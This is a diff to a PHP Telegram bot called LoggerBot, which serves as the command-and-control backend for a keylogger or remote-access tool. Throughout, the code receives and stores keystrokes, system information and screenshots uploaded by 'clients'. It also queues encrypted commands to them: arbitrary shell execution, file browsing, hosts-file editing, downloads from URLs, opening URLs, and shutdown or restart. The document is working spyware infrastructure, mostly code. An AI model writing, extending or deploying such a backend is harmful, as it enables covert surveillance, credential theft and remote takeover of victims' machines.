@@ -3,7 +3,6 @@ require_once __DIR__ . '/Config.php';
 
 class LoggerBot {
     private $pdo;
-    private $selectedClient = null;
 
     public function __construct() {
         $this->initDatabase();
@@ -69,40 +68,110 @@ class LoggerBot {
     }
 
     private function handleCallbackQuery($callbackQuery) {
-        $chatId = $callbackQuery['message']['chat']['id'];
-        $userId = $callbackQuery['from']['id'];
-        $data = $callbackQuery['data'];
-        
+        $chatId = $callbackQuery['message']['chat']['id'] ?? null;
+        $userId = $callbackQuery['from']['id'] ?? null;
+        $data = $callbackQuery['data'] ?? null;
+        $callbackQueryId = $callbackQuery['id'] ?? null;
+
+        $this->logWebhook("Processing callback_query: id=$callbackQueryId, user_id=$userId, chat_id=$chatId, data=$data");
+
+        if (!$chatId || !$userId || !$data || !$callbackQueryId) {
+            $this->logError("Invalid callback_query: missing required fields, data=" . json_encode($callbackQuery));
+            $this->makeCurlRequest(
+                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
+                ['callback_query_id' => $callbackQueryId, 'text' => 'Error: Invalid request', 'show_alert' => true],
+                false
+            );
+            return;
+        }
+
         if (!$this->isUserAuthorized($userId)) {
             $this->sendTelegramMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
+            $this->makeCurlRequest(
+                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
+                ['callback_query_id' => $callbackQueryId, 'text' => 'Unauthorized', 'show_alert' => true],
+                false
+            );
+            return;
+        }
+
+        if (!str_contains($data, ':')) {
+            $this->logError("Invalid callback_data format: $data");
+            $this->sendTelegramMessage($chatId, "Error: Invalid callback data.");
+            $this->makeCurlRequest(
+                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
+                ['callback_query_id' => $callbackQueryId, 'text' => 'Invalid callback data', 'show_alert' => true],
+                false
+            );
             return;
         }
 
         list($action, $value) = explode(':', $data, 2);
-        
+        $this->logWebhook("Callback action: $action, value: $value");
+
         if ($action === 'select_client') {
-            $this->selectedClient = $value;
-            $this->sendCommandKeyboard($chatId, "Selected client: $value. Choose a command:");
+            if ($this->clientExists($value)) {
+                $this->setSelectedClient($userId, $value);
+                $this->sendCommandKeyboard($chatId, "Selected client: $value. Choose a command:");
+                $this->logWebhook("Client selected via callback: $value, user_id: $userId, chat_id: $chatId");
+            } else {
+                $this->sendTelegramMessage($chatId, "Client ID '$value' not found. Use /start to see available clients.");
+                $this->logError("Invalid client_id in callback: $value, user_id: $userId, chat_id: $chatId");
+            }
         } elseif ($action === 'command') {
-            if ($this->selectedClient) {
-                $response = $this->processCommand($value, $this->selectedClient, true);
-                $this->sendTelegramMessage($chatId, "Command '$value' sent to client {$this->selectedClient}: " . json_encode($response['data']));
+            $selectedClient = $this->getSelectedClient($userId);
+            if ($selectedClient) {
+                $response = $this->processCommand($value, $selectedClient, true);
+                $this->sendTelegramMessage($chatId, "Command '$value' queued for client $selectedClient.");
+                $this->logWebhook("Command queued: $value for client: $selectedClient, response: " . json_encode($response));
             } else {
                 $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
+                $this->logError("Command attempted without selected client, command: $value, user_id: $userId, chat_id: $chatId");
             }
+        } else {
+            $this->logError("Unknown callback action: $action, data: $data");
+            $this->sendTelegramMessage($chatId, "Error: Unknown action.");
         }
 
-        $this->makeCurlRequest(
+        $response = $this->makeCurlRequest(
             "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
-            ['callback_query_id' => $callbackQuery['id']],
+            ['callback_query_id' => $callbackQueryId],
             false
         );
+        $this->logWebhook("answerCallbackQuery response: " . $response);
+    }
+
+    private function setSelectedClient($userId, $clientId) {
+        try {
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO user_selections (user_id, selected_client, updated_at) 
+                VALUES (?, ?, NOW()) 
+                ON DUPLICATE KEY UPDATE selected_client = ?, updated_at = NOW()"
+            );
+            $stmt->execute([$userId, $clientId, $clientId]);
+            $this->logWebhook("Set selected client: $clientId for user_id: $userId");
+        } catch (PDOException $e) {
+            $this->logError("Failed to set selected client for user_id: $userId, error: " . $e->getMessage());
+        }
+    }
+
+    private function getSelectedClient($userId) {
+        try {
+            $stmt = $this->pdo->prepare("SELECT selected_client FROM user_selections WHERE user_id = ?");
+            $stmt->execute([$userId]);
+            $result = $stmt->fetch();
+            $clientId = $result ? $result['selected_client'] : null;
+            $this->logWebhook("Retrieved selected client: " . ($clientId ?: 'none') . " for user_id: $userId");
+            return $clientId;
+        } catch (PDOException $e) {
+            $this->logError("Failed to get selected client for user_id: $userId, error: " . $e->getMessage());
+            return null;
+        }
     }
 
     private function handleClientRequest($input) {
         header('Content-Type: application/json');
 
-        // Merge $_POST with $input for multipart/form-data
         $data = array_merge($input, $_POST);
         $this->logWebhook("Client request data: " . json_encode($data));
 
@@ -128,10 +197,11 @@ class LoggerBot {
                 $response = $this->handleCommandResponse($data);
                 break;
             default:
-                $response = $this->processCommand($action, $clientId, true);
+                $response = ['error' => 'Unknown action'];
                 break;
         }
 
+        $this->logWebhook("Client request response for action: $action, client_id: $clientId, response: " . json_encode($response));
         echo json_encode($response);
     }
 
@@ -159,20 +229,19 @@ class LoggerBot {
             );
             $stmt->execute([$clientId]);
             $commands = $stmt->fetchAll();
+    
             $this->logWebhook("Fetched commands for client_id: $clientId, count: " . count($commands));
             return ['commands' => $commands];
         } catch (PDOException $e) {
-            $this->logError("Failed to fetch client commands: " . $e->getMessage());
+            $this->logError("Failed to fetch client commands for client_id: $clientId, error: " . $e->getMessage());
             return ['error' => 'Failed to fetch commands'];
         }
     }
 
     private function handleUploadData($data) {
         try {
-            // Log raw input for debugging
             $this->logWebhook("Upload data: " . json_encode($data) . ", FILES: " . json_encode($_FILES));
 
-            // Validate client_id
             $clientId = $data['client_id'] ?? null;
             if (!$clientId) {
                 $this->logError("Upload data failed: Missing client_id");
@@ -180,7 +249,6 @@ class LoggerBot {
                 return ['error' => 'Missing client_id'];
             }
 
-            // Validate and decrypt keystrokes
             $keystrokes = '';
             if (isset($data['keystrokes']) && !empty($data['keystrokes'])) {
                 $this->logWebhook("Received keystrokes for client_id: $clientId, data: " . substr($data['keystrokes'], 0, 50) . "...");
@@ -191,10 +259,9 @@ class LoggerBot {
                     $this->logWebhook("Decrypted keystrokes for client_id: $clientId, length: " . strlen($keystrokes));
                 }
             } else {
-                $this->logError("No keystrokes provided for client_id: $clientId");
+                $this->logWebhook("No keystrokes provided for client_id: $clientId");
             }
 
-            // Validate and decrypt system_info
             $systemInfo = '';
             if (isset($data['system_info']) && !empty($data['system_info'])) {
                 $this->logWebhook("Received system_info for client_id: $clientId, data: " . substr($data['system_info'], 0, 50) . "...");
@@ -202,7 +269,6 @@ class LoggerBot {
                 if ($systemInfo === '') {
                     $this->logError("System_info decryption failed or empty for client_id: $clientId");
                 } else {
-                    // Validate JSON format for system_info
                     $jsonCheck = json_decode($systemInfo, true);
                     if (json_last_error() !== JSON_ERROR_NONE) {
                         $this->logError("System_info is not valid JSON for client_id: $clientId, data: " . substr($systemInfo, 0, 50) . "...");
@@ -212,10 +278,9 @@ class LoggerBot {
                     }
                 }
             } else {
-                $this->logError("No system_info provided for client_id: $clientId");
+                $this->logWebhook("No system_info provided for client_id: $clientId");
             }
 
-            // Handle screenshot
             $screenshotPath = null;
             if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] === UPLOAD_ERR_OK) {
                 $filename = 'screenshot_' . $clientId . '_' . time() . '.png';
@@ -230,7 +295,6 @@ class LoggerBot {
                 $this->logWebhook("No screenshot provided or upload error for client_id: $clientId");
             }
 
-            // Insert into database
             try {
                 $stmt = $this->pdo->prepare(
                     "INSERT INTO user_data (client_id, keystrokes, system_info, screenshot_path, created_at) 
@@ -261,13 +325,32 @@ class LoggerBot {
                 $this->logError("Missing command_id in command response");
                 return ['error' => 'Missing command_id'];
             }
-
+            $resultData = json_decode($result, true);
             $stmt = $this->pdo->prepare(
                 "UPDATE client_commands SET status = 'completed', result = ?, completed_at = NOW() 
                 WHERE id = ?"
             );
-            $stmt->execute([$result, $commandId]);
-            $this->logWebhook("Updated command response for command_id: $commandId");
+            $stmt->execute([strlen($result) > 65000 ? 'Result too large, sent as file' : $result, $commandId]);
+            $stmt = $this->pdo->prepare(
+                "SELECT client_id, command FROM client_commands WHERE id = ?"
+            );
+            $stmt->execute([$commandId]);
+            $commandData = $stmt->fetch();
+            if ($commandData) {
+                $clientId = $commandData['client_id'];
+                $decryptedCommand = $this->decrypt($commandData['command']);
+                $commandJson = json_decode($decryptedCommand, true);
+                $commandType = $commandJson['type'] ?? 'unknown';
+                if ($commandType === 'edit_hosts' && isset($resultData['file_path'])) {
+                    $this->sendTelegramFile(Config::$ADMIN_CHAT_ID, $resultData['file_path'], 'sendDocument');
+                } else {
+                    $this->sendTelegramMessage(
+                        Config::$ADMIN_CHAT_ID,
+                        "Command '$commandType' result for client $clientId:\n" . ($result ?: 'No result')
+                    );
+                }
+            }
+            $this->logWebhook("Updated command response for command_id: $commandId, result: " . substr($result, 0, 50));
             return ['status' => 'success'];
         } catch (PDOException $e) {
             $this->logError("Command response failed: " . $e->getMessage());
@@ -291,16 +374,15 @@ class LoggerBot {
             return;
         }
 
-        // Handle /select command
         if (preg_match('/^\/select\s+(.+)$/', $text, $matches)) {
             $clientId = trim($matches[1]);
             if ($this->clientExists($clientId)) {
-                $this->selectedClient = $clientId;
+                $this->setSelectedClient($userId, $clientId);
                 $this->sendCommandKeyboard($chatId, "Selected client: $clientId. Choose a command:");
-                $this->logWebhook("Client selected via /select: $clientId, chat_id: $chatId");
+                $this->logWebhook("Client selected via /select: $clientId, user_id: $userId, chat_id: $chatId");
             } else {
                 $this->sendTelegramMessage($chatId, "Client ID '$clientId' not found. Use /start to see available clients.");
-                $this->logError("Invalid client_id in /select: $clientId, chat_id: $chatId");
+                $this->logError("Invalid client_id in /select: $clientId, user_id: $userId, chat_id: $chatId");
             }
             return;
         }
@@ -308,9 +390,10 @@ class LoggerBot {
         if (preg_match('/^\/start$/', $text)) {
             $this->sendClientKeyboard($chatId);
         } else {
-            if ($this->selectedClient) {
-                $response = $this->processCommand($text, $this->selectedClient, true);
-                $this->sendTelegramMessage($chatId, "Command '$text' sent to client {$this->selectedClient}: " . json_encode($response['data']));
+            $selectedClient = $this->getSelectedClient($userId);
+            if ($selectedClient) {
+                $response = $this->processCommand($text, $selectedClient, true);
+                $this->sendTelegramMessage($chatId, "Command '$text' queued for client $selectedClient.");
             } else {
                 $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
             }
@@ -422,30 +505,93 @@ class LoggerBot {
         $this->logCommand($recipient, $command);
 
         $response = ['status' => 'success', 'data' => ''];
-        switch (true) {
-            case preg_match('/^\/start$/', $command):
-                $response['data'] = $isClient ? "Started" : $this->sendClientKeyboard($recipient);
-                break;
+        $commandData = null;
 
+        // نگاشت دستورات به فرمت کلاینت
+        switch (true) {
             case preg_match('/^\/status$/', $command):
-                $response['data'] = $this->sendSystemStatus($recipient, $isClient);
+                $commandData = ['type' => 'system_info', 'params' => []];
+                $response['data'] = 'System status command queued';
                 break;
 
             case preg_match('/^\/screenshot$/', $command):
-                $response['data'] = $this->handleScreenshot($recipient, $isClient);
+                $commandData = ['type' => 'capture_screenshot', 'params' => []];
+                $response['data'] = 'Screenshot command queued';
+                break;
+
+            case preg_match('/^\/exec (.+)/', $command, $matches):
+                $commandData = ['type' => 'system_command', 'params' => ['command' => $matches[1]]];
+                $response['data'] = 'Execute command queued';
+                break;
+
+            case preg_match('/^\/hosts$/', $command):
+                $commandData = ['type' => 'edit_hosts', 'params' => ['action' => 'list']];
+                $response['data'] = 'Hosts command queued';
+                break;
+
+            case preg_match('/^\/browse (.+)/', $command, $matches):
+                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'list', 'path' => $matches[1]]];
+                $response['data'] = 'Browse directory command queued';
+                break;
+
+            case preg_match('/^\/get-info$/', $command):
+                $commandData = ['type' => 'system_info', 'params' => []];
+                $response['data'] = 'System info command queued';
+                break;
+
+            case preg_match('/^\/go (.+)/', $command, $matches):
+                $commandData = ['type' => 'open_url', 'params' => ['url' => $matches[1]]];
+                $response['data'] = 'Open URL command queued';
+                break;
+
+            case preg_match('/^\/shutdown$/', $command):
+                $commandData = ['type' => 'system_command', 'params' => ['command' => 'shutdown']];
+                $response['data'] = 'Shutdown command queued';
                 break;
 
             case preg_match('/^\/upload (.+)/', $command, $matches):
             case preg_match('/^\/upload_file (.+)/', $command, $matches):
-                $response['data'] = $this->handleFileUpload($recipient, $matches[1], $isClient);
+                $commandData = ['type' => 'upload_file', 'params' => ['source' => 'telegram', 'file_url' => $matches[1], 'dest_path' => $matches[1]]];
+                $response['data'] = 'Upload file command queued';
                 break;
 
-            case preg_match('/^\/exec (.+)/', $command, $matches):
-                $response['data'] = $this->executeCommand($recipient, $matches[1], $isClient);
+            case preg_match('/^\/upload_url (.+)/', $command, $matches):
+                $commandData = ['type' => 'upload_file', 'params' => ['source' => 'url', 'file_url' => $matches[1], 'dest_path' => basename($matches[1])]];
+                $response['data'] = 'Upload from URL command queued';
+                break;
+
+            case preg_match('/^\/tasks$/', $command):
+                $commandData = ['type' => 'process_management', 'params' => ['action' => 'list']];
+                $response['data'] = 'List tasks command queued';
+                break;
+
+            case preg_match('/^\/signout$/', $command):
+                $commandData = ['type' => 'system_command', 'params' => ['command' => 'signout']];
+                $response['data'] = 'Sign out command queued';
+                break;
+
+            case preg_match('/^\/sleep$/', $command):
+                $commandData = ['type' => 'system_command', 'params' => ['command' => 'sleep']];
+                $response['data'] = 'Sleep command queued';
+                break;
+
+            case preg_match('/^\/restart$/', $command):
+                $commandData = ['type' => 'system_command', 'params' => ['command' => 'restart']];
+                $response['data'] = 'Restart command queued';
+                break;
+
+            case preg_match('/^\/start$/', $command):
+                $response['data'] = $isClient ? "Started" : $this->sendClientKeyboard($recipient);
                 break;
 
             case preg_match('/^\/logs$/', $command):
-                $response['data'] = $this->sendLogs($recipient, $isClient);
+            case preg_match('/^\/screens$/', $command):
+            case preg_match('/^\/test_telegram$/', $command):
+            case preg_match('/^\/startup$/', $command):
+                $response['data'] = $isClient ? "Command not supported on client" : "Command executed on server";
+                if (!$isClient) {
+                    $this->sendTelegramMessage($recipient, "Command '$command' is server-side only.");
+                }
                 break;
 
             case preg_match('/^\/addadmin (\d+)$/', $command, $matches):
@@ -460,79 +606,27 @@ class LoggerBot {
                 $response['data'] = $this->listUsers($recipient, $isClient);
                 break;
 
-            case preg_match('/^\/hosts$/', $command):
-                $response['data'] = $this->getHosts($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/screens$/', $command):
-                $response['data'] = $this->listScreenshots($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/browse (.+)/', $command, $matches):
-                $response['data'] = $this->browseDirectory($recipient, $matches[1], $isClient);
-                break;
-
-            case preg_match('/^\/get-info$/', $command):
-                $response['data'] = $this->getSystemInfo($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/go (.+)/', $command, $matches):
-                $response['data'] = $this->goToUrl($recipient, $matches[1], $isClient);
-                break;
-
-            case preg_match('/^\/shutdown$/', $command):
-                $response['data'] = $this->systemShutdown($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/test_telegram$/', $command):
-                $response['data'] = $this->testTelegram($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/upload_url (.+)/', $command, $matches):
-                $response['data'] = $this->uploadFromUrl($recipient, $matches[1], $isClient);
-                break;
-
-            case preg_match('/^\/tasks$/', $command):
-                $response['data'] = $this->listTasks($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/startup$/', $command):
-                $response['data'] = $this->manageStartup($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/signout$/', $command):
-                $response['data'] = $this->signOut($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/sleep$/', $command):
-                $response['data'] = $this->systemSleep($recipient, $isClient);
-                break;
-
-            case preg_match('/^\/restart$/', $command):
-                $response['data'] = $this->systemRestart($recipient, $isClient);
-                break;
-
             default:
                 $response['data'] = $this->sendHelpMessage($recipient, $isClient);
                 break;
         }
 
-        if ($isClient && $response['status'] === 'success') {
-            $this->queueClientCommand($recipient, $command, json_encode($response['data']));
+        if ($isClient && $commandData) {
+            $this->queueClientCommand($recipient, $commandData);
         }
 
         return $response;
     }
 
-    private function queueClientCommand($clientId, $command, $response) {
+    private function queueClientCommand($clientId, $commandData) {
         try {
-            $encryptedCommand = $this->encrypt(json_encode(['type' => $command, 'params' => []]));
+            $encryptedCommand = $this->encrypt(json_encode($commandData));
             $stmt = $this->pdo->prepare(
                 "INSERT INTO client_commands (client_id, command, status, created_at) 
                 VALUES (?, ?, 'pending', NOW())"
             );
             $stmt->execute([$clientId, $encryptedCommand]);
-            $this->logWebhook("Queued command for client_id: $clientId, command: $command");
+            $this->logWebhook("Queued command for client_id: $clientId, command: " . json_encode($commandData));
         } catch (PDOException $e) {
             $this->logError("Failed to queue client command: " . $e->getMessage());
         }
@@ -607,17 +701,22 @@ class LoggerBot {
 
     private function sendTelegramMessage($chatId, $text, $options = []) {
         $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/sendMessage";
+        
+        $parseMode = stripos($text, 'Error') !== false ? null : 'Markdown';
+        
         $data = array_merge([
             'chat_id' => $chatId,
-            'text' => $text,
-            'parse_mode' => 'Markdown'
+            'text' => $text
         ], $options);
-
-        // Ensure reply_markup is JSON-encoded
+    
+        if ($parseMode) {
+            $data['parse_mode'] = $parseMode;
+        }
+    
         if (isset($data['reply_markup'])) {
             $data['reply_markup'] = json_encode($data['reply_markup']);
         }
-
+    
         $this->logWebhook("Sending Telegram message to chat_id: $chatId, payload: " . json_encode($data));
         $response = $this->makeCurlRequest($url, $data, false);
         $this->logWebhook("Telegram sendMessage response: " . $response);
@@ -640,12 +739,11 @@ class LoggerBot {
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-
+        
         if ($isFile) {
             curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
         } else {
-            // Send raw JSON payload for non-file requests
+            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
             curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
         }
         
@@ -671,106 +769,41 @@ class LoggerBot {
     }
 
     private function sendSystemStatus($recipient, $isClient = false) {
-        $status = [
-            'uptime' => exec('uptime'),
-            'disk_space' => disk_free_space(__DIR__) / disk_total_space(__DIR__) * 100,
-            'memory' => memory_get_usage(true) / 1024 / 1024 . ' MB'
-        ];
-
-        $message = "System Status:\n" .
-                  "Uptime: {$status['uptime']}\n" .
-                  "Disk Space: " . number_format($status['disk_space'], 2) . "% free\n" .
-                  "Memory Usage: {$status['memory']}";
-
         if ($isClient) {
-            return $message;
+            return "System status command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return "Status sent";
+        $this->sendTelegramMessage($recipient, "System status command queued");
+        return "Status command queued";
     }
 
     private function handleScreenshot($recipient, $isClient = false) {
-        $filename = Config::$SCREENSHOT_DIR . 'screenshot_' . time() . '.png';
-        $command = "scrot $filename";
-        exec($command, $output, $return_var);
-
-        if ($return_var === 0 && file_exists($filename)) {
-            if ($isClient) {
-                $content = base64_encode(file_get_contents($filename));
-                unlink($filename);
-                return ['filename' => basename($filename), 'content' => $content];
-            }
-            $this->sendTelegramFile($recipient, $filename, 'sendPhoto');
-            unlink($filename);
-            return "Screenshot sent";
-        }
-        $message = 'Failed to take screenshot';
         if ($isClient) {
-            return $message;
+            return "Screenshot command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Screenshot command queued");
+        return "Screenshot command queued";
     }
 
     private function handleFileUpload($recipient, $filePath, $isClient = false) {
-        $fullPath = Config::$UPLOAD_DIR . basename($filePath);
-        
-        if (file_exists($fullPath)) {
-            if ($isClient) {
-                $content = base64_encode(file_get_contents($fullPath));
-                return ['filename' => basename($fullPath), 'content' => $content];
-            }
-            $this->sendTelegramFile($recipient, $fullPath);
-            return "File uploaded";
-        }
-        $message = 'File not found';
         if ($isClient) {
-            return $message;
+            return "File upload command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "File upload command queued");
+        return "File upload command queued";
     }
 
     private function executeCommand($recipient, $command, $isClient = false) {
-        $startTime = time();
-        $descriptors = [
-            1 => ['pipe', 'w'],
-            2 => ['pipe', 'w']
-        ];
-        
-        $process = proc_open($command, $descriptors, $pipes);
-        
-        if (is_resource($process)) {
-            stream_set_timeout($pipes[1], Config::$COMMAND_TIMEOUT);
-            stream_set_timeout($pipes[2], Config::$COMMAND_TIMEOUT);
-            
-            $output = stream_get_contents($pipes[1]);
-            $errors = stream_get_contents($pipes[2]);
-            
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            proc_close($process);
-
-            $response = empty($errors) ? $output : "Error: $errors";
-            
-            $encrypted = $this->encrypt($response);
-            
-            if ($isClient) {
-                return ['output' => $encrypted];
-            }
-            $this->sendTelegramMessage($recipient, $encrypted ?: 'Command execution failed');
-            $this->logCommand($recipient, $command, $response);
-            return "Command executed";
-        }
-        $message = 'Failed to execute command';
         if ($isClient) {
-            return $message;
+            return "Execute command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Execute command queued");
+        return "Execute command queued";
     }
 
     private function sendLogs($recipient, $isClient = false) {
+        if ($isClient) {
+            return "Logs command not supported on client";
+        }
         $logFiles = [
             Config::$ERROR_LOG,
             Config::$WEBHOOK_LOG,
@@ -780,194 +813,119 @@ class LoggerBot {
 
         foreach ($logFiles as $logFile) {
             if (file_exists($logFile) && filesize($logFile) <= Config::$MAX_LOG_SIZE) {
-                if ($isClient) {
-                    $results[] = [
-                        'filename' => basename($logFile),
-                        'content' => base64_encode(file_get_contents($logFile))
-                    ];
-                } else {
-                    $this->sendTelegramFile($recipient, $logFile);
-                }
+                $this->sendTelegramFile($recipient, $logFile);
             }
-        }
-
-        if ($isClient) {
-            return $results ?: 'No logs available';
         }
         return "Logs sent";
     }
 
     private function getHosts($recipient, $isClient = false) {
-        $hostsFile = '/etc/hosts';
-        if (file_exists($hostsFile)) {
-            $content = file_get_contents($hostsFile);
-            if ($isClient) {
-                return ['content' => $content];
-            }
-            $this->sendTelegramMessage($recipient, "Hosts file:\n$content");
-            return "Hosts file sent";
-        }
-        $message = 'Hosts file not found';
         if ($isClient) {
-            return $message;
+            return "Hosts command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Hosts command queued");
+        return "Hosts command queued";
     }
 
     private function listScreenshots($recipient, $isClient = false) {
+        if ($isClient) {
+            return "Screenshots command not supported on client";
+        }
         $files = glob(Config::$SCREENSHOT_DIR . '*.png');
         $fileList = array_map('basename', $files);
         $message = "Screenshots:\n" . (empty($fileList) ? "No screenshots found" : implode("\n", $fileList));
-
-        if ($isClient) {
-            return ['files' => $fileList];
-        }
         $this->sendTelegramMessage($recipient, $message);
         return "Screenshot list sent";
     }
 
     private function browseDirectory($recipient, $path, $isClient = false) {
-        $safePath = realpath(Config::$UPLOAD_DIR . '/' . $path);
-        if ($safePath && strpos($safePath, Config::$UPLOAD_DIR) === 0 && is_dir($safePath)) {
-            $files = scandir($safePath);
-            $fileList = array_filter($files, fn($file) => $file !== '.' && $file !== '..');
-            $message = "Directory $path:\n" . (empty($fileList) ? "Empty directory" : implode("\n", $fileList));
-
-            if ($isClient) {
-                return ['files' => $fileList];
-            }
-            $this->sendTelegramMessage($recipient, $message);
-            return "Directory listing sent";
-        }
-        $message = 'Invalid or inaccessible directory';
         if ($isClient) {
-            return $message;
+            return "Browse directory command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Browse directory command queued");
+        return "Browse directory command queued";
     }
 
     private function getSystemInfo($recipient, $isClient = false) {
-        $info = [
-            'os' => php_uname(),
-            'php_version' => phpversion(),
-            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
-            'disk_total' => disk_total_space(__DIR__) / 1024 / 1024 / 1024 . ' GB',
-            'disk_free' => disk_free_space(__DIR__) / 1024 / 1024 / 1024 . ' GB'
-        ];
-
-        $message = "System Info:\n" . implode("\n", array_map(fn($k, $v) => "$k: $v", array_keys($info), $info));
-
         if ($isClient) {
-            return $info;
+            return "System info command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return "System info sent";
+        $this->sendTelegramMessage($recipient, "System info command queued");
+        return "System info command queued";
     }
 
     private function goToUrl($recipient, $url, $isClient = false) {
-        $command = "xdg-open " . escapeshellarg($url);
-        exec($command, $output, $return_var);
-
-        $message = $return_var === 0 ? "Opened URL: $url" : "Failed to open URL";
         if ($isClient) {
-            return $message;
+            return "Open URL command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Open URL command queued");
+        return "Open URL command queued";
     }
 
     private function systemShutdown($recipient, $isClient = false) {
-        exec('sudo shutdown -h now', $output, $return_var);
-        $message = $return_var === 0 ? "System shutting down" : "Failed to shutdown";
         if ($isClient) {
-            return $message;
+            return "Shutdown command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Shutdown command queued");
+        return "Shutdown command queued";
     }
 
     private function testTelegram($recipient, $isClient = false) {
+        if ($isClient) {
+            return "Test Telegram command not supported on client";
+        }
         $response = $this->makeCurlRequest("https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getMe", [], false);
         $message = json_decode($response, true)['ok'] ? "Telegram API is working" : "Telegram API test failed";
-
-        if ($isClient) {
-            return $message;
-        }
         $this->sendTelegramMessage($recipient, $message);
         return $message;
     }
 
     private function uploadFromUrl($recipient, $url, $isClient = false) {
-        $filename = Config::$UPLOAD_DIR . 'downloaded_' . time() . '_' . basename($url);
-        $content = file_get_contents($url);
-        if ($content !== false && file_put_contents($filename, $content)) {
-            if ($isClient) {
-                $content = base64_encode(file_get_contents($filename));
-                unlink($filename);
-                return ['filename' => basename($filename), 'content' => $content];
-            }
-            $this->sendTelegramFile($recipient, $filename);
-            unlink($filename);
-            return "File uploaded from URL";
-        }
-        $message = "Failed to download from URL";
         if ($isClient) {
-            return $message;
+            return "Upload from URL command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Upload from URL command queued");
+        return "Upload from URL command queued";
     }
 
     private function listTasks($recipient, $isClient = false) {
-        exec('ps aux', $output);
-        $tasks = implode("\n", $output);
-        $message = "Running tasks:\n" . ($tasks ?: "No tasks found");
-
         if ($isClient) {
-            return ['tasks' => $tasks];
+            return "List tasks command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return "Tasks listed";
+        $this->sendTelegramMessage($recipient, "List tasks command queued");
+        return "List tasks command queued";
     }
 
     private function manageStartup($recipient, $isClient = false) {
-        $message = "Startup management not fully implemented. Check crontab or systemd services.";
         if ($isClient) {
-            return $message;
+            return "Startup command not supported on client";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Startup management not fully implemented.");
+        return "Startup command not supported";
     }
 
     private function signOut($recipient, $isClient = false) {
-        $message = "Sign out not fully implemented. Requires system-specific user session management.";
         if ($isClient) {
-            return $message;
+            return "Sign out command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Sign out command queued");
+        return "Sign out command queued";
     }
 
     private function systemSleep($recipient, $isClient = false) {
-        exec('sudo systemctl suspend', $output, $return_var);
-        $message = $return_var === 0 ? "System entering sleep mode" : "Failed to enter sleep mode";
         if ($isClient) {
-            return $message;
+            return "Sleep command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Sleep command queued");
+        return "Sleep command queued";
     }
 
     private function systemRestart($recipient, $isClient = false) {
-        exec('sudo reboot', $output, $return_var);
-        $message = $return_var === 0 ? "System restarting" : "Failed to restart";
         if ($isClient) {
-            return $message;
+            return "Restart command queued";
         }
-        $this->sendTelegramMessage($recipient, $message);
-        return $message;
+        $this->sendTelegramMessage($recipient, "Restart command queued");
+        return "Restart command queued";
     }
 
     private function addAdmin($recipient, $newAdminId, $isClient = false) {
